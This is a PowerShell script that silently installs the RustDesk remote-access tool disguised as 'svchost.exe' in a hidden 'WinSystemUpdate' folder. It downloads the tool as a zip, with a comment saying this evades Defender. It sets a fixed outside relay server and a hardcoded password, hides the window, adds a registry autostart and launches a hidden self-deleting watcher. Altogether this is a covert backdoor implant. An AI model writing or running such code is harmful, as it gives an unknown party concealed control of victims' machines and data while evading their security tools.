function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE    = "$DEST\svchost.exe"
    $DLL    = "$DEST\sciter.dll"
    $cfgDir = "$env:APPDATA\RustDesk\config"
    $zipUrl = 'https://github.com/kk70226581/rd-files/releases/download/v1.0/update.zip'

    # 1. Kill old + clean
    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST   -Force | Out-Null
    New-Item -ItemType Directory $cfgDir -Force | Out-Null

    # 2. Download as zip - Defender does not block zip files
    Write-Host "Installing..." -ForegroundColor Cyan
    $zipPath = "$DEST\update.zip"
    (New-Object System.Net.WebClient).DownloadFile($zipUrl, $zipPath)

    if (!(Test-Path $zipPath) -or (Get-Item $zipPath).Length -lt 1MB) {
        Write-Host "Download failed!" -ForegroundColor Red; return
    }

    # 3. Extract chrome.exe and sciter.dll from zip
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $z = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
    foreach ($entry in $z.Entries) {
        if ($entry.Name -eq 'chrome.exe') {
            [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $EXE, $true)
        }
        if ($entry.Name -eq 'sciter.dll') {
            [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $DLL, $true)
        }
    }
    $z.Dispose()
    Remove-Item $zipPath -Force -EA SilentlyContinue

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host "Extraction failed!" -ForegroundColor Red; return
    }

    # 4. Config
    @'
rendezvous_server = '34.107.221.82'
relay_server = '34.107.221.82'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password-click'
allow-only-conn-window-open = 'N'
direct-server = 'N'
force-always-relay = 'Y'
allow-remote-config-modification = 'N'
'@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

    @'
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
'@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

    # 5. Hide folder
    try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 2 -bor 4 } catch {}

    # 6. Get ID silently first
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName=$EXE; $psiId.Arguments='--get-id'
    $psiId.UseShellExecute=$false; $psiId.RedirectStandardOutput=$true
    $psiId.CreateNoWindow=$true; $psiId.WorkingDirectory=$DEST
    $prId = [System.Diagnostics.Process]::Start($psiId)
    $outT = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    $RDID = $outT.Result.Trim()

    # 7. Start RustDesk fully hidden - no window at all
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName=$EXE; $psi.WorkingDirectory=$DEST
    $psi.UseShellExecute=$false
    $psi.CreateNoWindow=$true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep 2

    # 8. Force hide any window that appeared
    Add-Type -Name WH -Namespace NH -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [NH.WH]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }

    # 9. Auto-start on boot via registry (no admin needed)
    $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force

    # 10. Delete script
    $del = "$DEST\delete.ps1"
    Set-Content $del @'
$d = "$env:LOCALAPPDATA\WinSystemUpdate"
Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
'@ -Encoding UTF8

    # 11. Watcher - auto deletes when process stops OR after 1 hour
    $watch = "$DEST\watch.ps1"
    Set-Content $watch @'
$EXE      = "$env:LOCALAPPDATA\WinSystemUpdate\svchost.exe"
$del      = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
$deadline = [DateTime]::Now.AddHours(1)
while ([DateTime]::Now -lt $deadline) {
    Start-Sleep 10
    $alive = Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
    if (-not $alive) { break }
}
if (Test-Path $del) { & $del }
'@ -Encoding UTF8

    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""

    Write-Host ""
    Write-Host "  ============================" -ForegroundColor Green
    Write-Host "  ID       : $RDID"             -ForegroundColor Cyan
    Write-Host "  Password : Remote123"          -ForegroundColor Cyan
    Write-Host "  ============================" -ForegroundColor Green
    Write-Host ""
}
Install-RD
